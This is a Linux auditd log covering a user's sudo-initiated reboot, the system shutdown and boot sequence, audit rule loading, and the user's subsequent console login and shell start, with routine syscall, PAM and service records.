type=SYSCALL msg=audit(1789326428.309:169): arch=c000003e syscall=59 success=yes exit=0 a0=562893c10440 a1=562893c17ed0 a2=562893ae6e50 a3=28fcaef0ba15787c items=3 ppid=947 pid=1070 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326428.309:169): argc=4 a0="sudo" a1="reboot" a2="-h" a3="now"
type=CWD msg=audit(1789326428.309:169): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326428.309:169): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326428.309:169): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326428.309:169): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326428.309:169): proctitle=7375646F007265626F6F74002D68006E6F77
type=USER_ACCT msg=audit(1789326428.313:170): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789326428.313:171): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='cwd="/home/Tom/Projects" cmd=7265626F6F74202D68206E6F77 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789326428.313:172): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789326428.313:173): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789326428.333:174): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789326428.333:175): pid=1070 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SERVICE_STOP msg=audit(1789326428.381:176): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.381:177): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.385:178): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.401:179): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.401:180): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.437:181): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789326428.449:182): prog-id=9 op=UNLOAD
type=SERVICE_STOP msg=audit(1789326428.457:183): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.477:184): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.489:185): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_SHUTDOWN msg=audit(1789326428.529:186): pid=1109 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.533:187): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.533:188): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-sysctl comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.533:189): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-modules-load comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.537:190): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326428.537:191): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-binfmt comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=DAEMON_END msg=audit(1789326428.552:17): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789326441.559:8174): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=478 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SERVICE_START msg=audit(1789326441.615:13): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CONFIG_CHANGE msg=audit(1789326441.631:14): op=set audit_backlog_limit=8192 old=64 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789326441.631:14): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd57448880 a2=3c a3=0 items=0 ppid=482 pid=522 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326441.631:14): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789326441.631:15): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789326441.631:15): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd57448880 a2=3c a3=0 items=0 ppid=482 pid=522 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326441.631:15): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789326441.631:16): op=set audit_backlog_wait_time=60000 old=15000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789326441.631:16): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffd57448880 a2=3c a3=0 items=0 ppid=482 pid=522 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326441.631:16): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789326441.631:17): auid=4294967295 ses=4294967295 subj=unconfined op=add_rule key="tom_exe" list=4 res=1AUID="unset"
type=SYSCALL msg=audit(1789326441.631:17): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7ffd57448940 a2=428 a3=0 items=0 ppid=482 pid=522 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326441.631:17): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789326441.639:18): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_BOOT msg=audit(1789326441.671:19): pid=537 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326441.675:20): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326441.699:21): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789326441.703:22): prog-id=9 op=LOAD
type=BPF msg=audit(1789326441.703:23): prog-id=10 op=LOAD
type=BPF msg=audit(1789326441.703:24): prog-id=11 op=LOAD
type=SERVICE_START msg=audit(1789326444.577:25): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.601:26): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.613:27): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.617:28): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.617:29): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.685:30): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326444.685:31): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.701:32): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_RUNLEVEL msg=audit(1789326444.713:33): pid=617 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='old-level=N new-level=5 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789326444.717:34): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789326444.717:35): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789326467.577:36): pid=612 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789326467.577:37): pid=612 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789326467.577:38): pid=612 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=tty1 old-ses=4294967295 ses=1 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789326467.577:38): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7ffc8a164160 a2=4 a3=7ffc8a163e74 items=0 ppid=1 pid=612 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326467.577:38): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789326467.661:39): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789326467.681:40): pid=623 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789326467.681:41): pid=623 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789326467.681:42): pid=623 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=2 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789326467.681:42): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7ffc3d583600 a2=4 a3=7ffc3d583314 items=0 ppid=1 pid=623 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789326467.681:42): proctitle="(systemd)"
type=USER_START msg=audit(1789326467.681:43): pid=623 uid=0 auid=1000 ses=2 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789326467.685:44): arch=c000003e syscall=59 success=yes exit=0 a0=55831d5fe060 a1=55831d5cb150 a2=55831d60ee50 a3=0 items=3 ppid=1 pid=623 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.685:44): argc=2 a0="/lib/systemd/systemd" a1="--user"
type=CWD msg=audit(1789326467.685:44): cwd="/"
type=PATH msg=audit(1789326467.685:44): item=0 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.685:44): item=1 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.685:44): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.685:44): proctitle="(systemd)"
type=SYSCALL msg=audit(1789326467.693:45): arch=c000003e syscall=59 success=yes exit=0 a0=56357e6da070 a1=7ffeee4f2340 a2=7ffeee4f2bf0 a3=0 items=3 ppid=625 pid=626 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="30-systemd-envi" exe="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.693:45): argc=1 a0="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=CWD msg=audit(1789326467.693:45): cwd="/"
type=PATH msg=audit(1789326467.693:45): item=0 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.693:45): item=1 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.693:45): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.693:45): proctitle="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=SYSCALL msg=audit(1789326467.701:46): arch=c000003e syscall=59 success=yes exit=0 a0=56357e6dda90 a1=7ffeee4f23b0 a2=56357e6ddb30 a3=2b3691261ec0668d items=3 ppid=627 pid=628 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd-xdg-aut" exe="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.701:46): argc=4 a0="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" a1="/run/user/1000/systemd/generator" a2="/run/user/1000/systemd/generator.early" a3="/run/user/1000/systemd/generator.late"
type=CWD msg=audit(1789326467.701:46): cwd="/"
type=PATH msg=audit(1789326467.701:46): item=0 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.701:46): item=1 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.701:46): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.701:46): proctitle=2F7573722F6C69622F73797374656D642F757365722D67656E657261746F72732F73797374656D642D7864672D6175746F73746172742D67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E65726174
type=SYSCALL msg=audit(1789326467.793:47): arch=c000003e syscall=59 success=yes exit=0 a0=56357e716f90 a1=56357e720d80 a2=56357e6e06f0 a3=0 items=3 ppid=623 pid=629 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.793:47): argc=4 a0="/bin/systemctl" a1="--user" a2="set-environment" a3="DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus"
type=CWD msg=audit(1789326467.793:47): cwd="/home/Tom"
type=PATH msg=audit(1789326467.793:47): item=0 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.793:47): item=1 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.793:47): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.793:47): proctitle=2F62696E2F73797374656D63746C002D2D75736572007365742D656E7669726F6E6D656E7400444255535F53455353494F4E5F4255535F414444524553533D756E69783A706174683D2F72756E2F757365722F313030302F627573
type=SERVICE_START msg=audit(1789326467.805:48): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789326467.813:49): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789326467.817:50): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_LOGIN msg=audit(1789326467.817:51): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=login acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789326467.817:52): arch=c000003e syscall=59 success=yes exit=0 a0=556d610b8c70 a1=7ffc8a163de0 a2=556d610b8db0 a3=0 items=3 ppid=612 pid=630 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="bash" exe="/usr/bin/bash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.817:52): argc=1 a0="-bash"
type=CWD msg=audit(1789326467.817:52): cwd="/home/Tom"
type=PATH msg=audit(1789326467.817:52): item=0 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.817:52): item=1 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326467.817:52): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326467.817:52): proctitle="-bash"
type=SYSCALL msg=audit(1789326467.821:53): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a446910 a1=55a97a447450 a2=55a97a444060 a3=8 items=3 ppid=630 pid=631 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="id" exe="/usr/bin/id" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326467.821:53): argc=2 a0="id" a1="-u"
type=CWD msg=audit(1789326467.821:53): cwd="/home/Tom"
